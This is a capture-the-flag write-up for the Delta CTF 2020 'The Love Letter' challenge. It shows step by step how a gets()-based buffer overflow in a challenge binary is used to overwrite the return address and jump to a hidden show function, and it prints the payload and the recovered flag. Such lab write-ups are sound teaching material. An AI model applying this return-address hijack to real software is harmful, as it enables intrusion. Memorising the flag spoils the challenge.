# Delta CTF 2020: The Love Letter.


> Find and submit the {flag}
>
> (./file/letter)

## Write-up

1. You are given an executable file called `letter`. When we try running the executable, we get the output as follows.

```bash
$ ./letter
Enter 10-digit Access Code: 1111111111
Access denied. You have to try harder ;)
```

The binary appears to prompt for a code, and denies access if the given code is incorrect.

2. When we enter a long string as input, we observe a segmentation fault.

```bash
$ ./letter
Enter 10-digit Access Code: 111111111111111111111111111111111111111
Access denied. You have to try harder ;)
Segmentation fault (core dumped)
```

This indicates that there might be a buffer overflow occurring.

3. We can confirm that by running `readelf`, which shows us the sections that are there in the executable.

```bash
$ readelf -s gateway
Symbol table '.dynsym' contains 10 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
    0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
    1: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
    2: 00000000     0 FUNC    GLOBAL DEFAULT  UND fflush@GLIBC_2.0 (2)
    3: 00000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.0 (2)
    4: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (2)
    5: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    6: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
    7: 00000000     0 FUNC    GLOBAL DEFAULT  UND execl@GLIBC_2.0 (2)
    8: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@GLIBC_2.0 (2)
    9: 0804a004     4 OBJECT  GLOBAL DEFAULT   17 _IO_stdin_used
  
Symbol table '.symtab' contains 74 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
    48: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.0
    49: 00000000     0 FUNC    GLOBAL DEFAULT  UND fflush@@GLIBC_2.0
    50: 00000000     0 FUNC    GLOBAL DEFAULT  UND gets@@GLIBC_2.0
    51: 08049365     0 FUNC    GLOBAL HIDDEN    15 __x86.get_pc_thunk.bp
    52: 0804c02c     0 NOTYPE  GLOBAL DEFAULT   25 _edata
    53: 0804936c     0 FUNC    GLOBAL HIDDEN    16 _fini
    54: 08049216    60 FUNC    GLOBAL DEFAULT   15 show
    55: 0804c024     0 NOTYPE  GLOBAL DEFAULT   25 __data_start
    56: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.0
    57: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    58: 0804c028     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle
    59: 0804a004     4 OBJECT  GLOBAL DEFAULT   17 _IO_stdin_used
    60: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    61: 080492f0   101 FUNC    GLOBAL DEFAULT   15 __libc_csu_init
    62: 0804c030     0 NOTYPE  GLOBAL DEFAULT   26 _end
    63: 08049140     5 FUNC    GLOBAL HIDDEN    15 _dl_relocate_static_pie
    64: 08049100    59 FUNC    GLOBAL DEFAULT   15 _start
    65: 0804a000     4 OBJECT  GLOBAL DEFAULT   17 _fp_hw
    66: 00000000     0 FUNC    GLOBAL DEFAULT  UND execl@@GLIBC_2.0
    67: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@@GLIBC_2.0
    68: 0804c02c     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
    69: 0804928f    88 FUNC    GLOBAL DEFAULT   15 main
    70: 08049252    61 FUNC    GLOBAL DEFAULT   15 broken
    71: 080492e7     0 FUNC    GLOBAL HIDDEN    15 __x86.get_pc_thunk.ax
    72: 0804c02c     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__
    73: 08049000     0 FUNC    GLOBAL HIDDEN    12 _init
```

We can see that it calls the function `gets`, which is a very vulnerable function to get input in C. Therefore, it is confirmed that a buffer overflow is occurring here.

We can also see from the output of `readelf` that there's a function other than `main`, called `show`, whose address is `08049216`.

4. The maximum length that the name can be is given as 10, hence we can find the point of overflow by starting at 11 and incrementing the length of input by 2 and analyzing the output of `dmesg | tail` to see when the return address is overwritten.

```bash
$ python -c 'print ("A"*23)' | ./letter
Enter 10-digit Access Code: Access denied. You have to try harder ;)
Segmentation fault (core dumped)

$ dmesg | tail
[ 4086.477530] letter[14442]: segfault at 8040041 ip 0000000008040041 sp 00000000ffed45a0 error 14 in letter[8048000+1000]
```

We can see that at a length of 23, the last A has appeared at the last byte of the instruction pointer, with the hex value of `0x41`.

5. By giving the address of the `show` function in little endian as input, we can redirect the flow of execution.

```bash
$ python -c 'print ("A"*22 + "\x16\x92\x04\x08")' | ./file/letter
Enter 10-digit Access Code: Access denied. You have to try harder ;)
cat: flag.txt: No such file or directory
```

Therefore, it looks like the binary tries to print the contents of a file called `flag.txt`.

6. When entering this input on the server, we get the output as follows.

```bash
$ python -c 'print ("A"*22 + "\x16\x92\x04\x08")' | ./letter
Enter 10-digit Access Code: Access denied. You have to try harder ;)
dctf{Y0ur3_l1K3_A_Fr13nD_7o_M3}
```

Therefore, we find that the flag is dctf{Y0ur3_l1K3_A_Fr13nD_7o_M3}.